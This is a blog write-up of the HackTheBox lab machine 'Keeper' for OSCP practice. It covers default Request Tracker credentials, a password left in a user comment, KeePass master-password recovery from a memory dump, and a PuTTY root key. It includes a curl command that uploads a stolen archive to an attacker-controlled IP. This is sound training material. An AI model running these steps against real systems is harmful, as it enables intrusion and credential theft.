+++
date = '2026-05-18T00:00:00-03:00'
draft = false
title = 'HTB: Keeper - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'keepass', 'request-tracker', 'default-creds', 'putty']
description = 'Write-up for the HackTheBox machine Keeper - default credentials on a Request Tracker instance, a password in a user comment, and a KeePass memory dump leading to a PuTTY private key for root.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-keeper/cover.png'
+++

Default credentials and a comment field that should never have held a password - two very human mistakes that open the door all the way to root.

## Machine info

| | |
|---|---|
| **Name** | Keeper |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Web server redirects to `tickets.keeper.htb` running Request Tracker (RT) - default credentials (`root:password`) work
- A user profile comment reads "Initial password set to Welcome2023!" - SSH access as `lnorgaard`
- Home directory contains `RT30000.zip` with a KeePass dump and `.kdbx` file
- `keepass_dump` recovers a partial master password; context clues complete it
- KeePass vault holds a PuTTY SSH key for root - convert and log in

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A 10.129.229.41
```

![Nmap results](/images/htb-keeper/nmap-scan.png)

Ports 22 (SSH) and 80 (HTTP). Nginx 1.18.0 on Ubuntu.

---

## Enumeration

### Request Tracker

Visiting the IP redirects immediately:

![Browser showing tickets.keeper.htb redirect](/images/htb-keeper/site-redirect.png)

After adding `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts`, the login page loads:

![RT login page](/images/htb-keeper/rt-login.png)

A quick search for the default credentials of Best Practical's Request Tracker:

![RT default credentials: root / password](/images/htb-keeper/rt-default-creds.png)

`root:password` - and it works. Once in, browsing the Users tab reveals a user named `lnorgaard`. Inside her profile, the Comments field has a message left by an admin:

![User profile comment with Welcome2023! password](/images/htb-keeper/user-comment-password.png)

"New user. Initial password set to Welcome2023!" - a classic ITSM footgun.

---

## Foothold

### SSH as lnorgaard

```bash
ssh lnorgaard@keeper.htb
```

![SSH login as lnorgaard](/images/htb-keeper/ssh-lnorgaard.png)

Inside the home directory:

![Home directory listing and user.txt](/images/htb-keeper/user-txt.png)

`user.txt` and `RT30000.zip`. The zip is the interesting one.

---

## Privilege Escalation

### KeePass dump analysis

Unzipping the archive:

![Unzipping RT30000.zip](/images/htb-keeper/unzip-rt30000.png)

Two files: `KeePassDumpFull.dmp` (a memory dump) and `passcodes.kdbx` (the KeePass database). Transfer them to Kali:

![Uploading RT30000.zip to Kali](/images/htb-keeper/upload-zip.png)

```bash
# on the target
curl -X POST 10.10.14.208/upload -F "files=@RT30000.zip" --insecure

# on Kali - simple upload receiver
python3 -m uploadserver
```

Using [keepass_dump](https://github.com/z-jxy/keepass_dump) to extract the master password from the memory dump:

![keepass_dump partial output](/images/htb-keeper/keepass-dump-output.png)

The tool recovers most characters but the first one is marked `{UNKNOWN}`. The extracted fragment reads: `{UNKNOWN}dgrd med flde`.

### Recovering the missing character

That looks like it could be a word in a foreign language. Searching for it:

![Google showing Rodgrod med flode](/images/htb-keeper/rodgrod-search.png)

"Rodgrod med flode" - a traditional Danish dessert. The lnorgaard user profile listed her language as Danish. The full master password is `rødgrød med fløde`.

### Opening the KeePass vault

```bash
keepass2 passcodes.kdbx
```

![KeePass2 opening the database](/images/htb-keeper/keepass2-open.png)

![KeePass database contents showing PuTTY key for root](/images/htb-keeper/keepass-database.png)

The database has an entry for `root` on `keeper.htb` with a PuTTY-format SSH private key in the notes field.

### Converting PuTTY key to OpenSSH and logging in

PuTTY keys (`.ppk`) are not directly usable with OpenSSH. Convert it first:

```bash
puttygen id_rsa -O private-openssh -o id_rsa2
```

![puttygen conversion and root SSH login](/images/htb-keeper/root-shell.png)

```bash
ssh root@keeper.htb -i id_rsa2
```

Root shell.

---

## Takeaways (for OSCP)

- **Default credentials on internal tooling are almost always worth trying.** Request Tracker, Gitea, Grafana, phpMyAdmin - they all ship with documented defaults and admins often forget to change them.
- **Comment/description fields in user management systems leak credentials constantly.** In real engagements, HR and IT portals are a goldmine for this.
- **Memory dumps of running applications can yield credentials.** KeePass CVE-2023-32784 is patched now, but the technique - dumping a process and searching for secrets in memory - applies broadly.
- **PuTTY keys are a format mismatch trap.** `puttygen` is the conversion tool; remember it for exams.

## References

- [HackTheBox - Keeper](https://app.hackthebox.com/machines/Keeper)
- [keepass_dump - GitHub](https://github.com/z-jxy/keepass_dump)
- [CVE-2023-32784 - KeePass master password recovery](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
- Lain Kusanagi list (OSCP prep)
